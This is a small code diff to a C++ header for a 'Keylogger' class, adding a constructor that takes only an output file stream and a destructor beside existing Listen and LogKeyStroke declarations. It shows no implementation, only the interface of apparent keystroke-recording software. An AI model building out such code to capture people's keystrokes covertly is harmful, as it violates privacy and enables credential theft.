@@ -11,6 +11,9 @@
 class Keylogger {
 public:
     Keylogger(std::ofstream&& outputFile, OSManager& manager, WindowInfo& windowInfo, KeyInput& keyInput);
+    Keylogger(std::ofstream&& outputFile);
+
+    ~Keylogger();
 
     void Listen();
     void LogKeyStroke(int keyStroke);
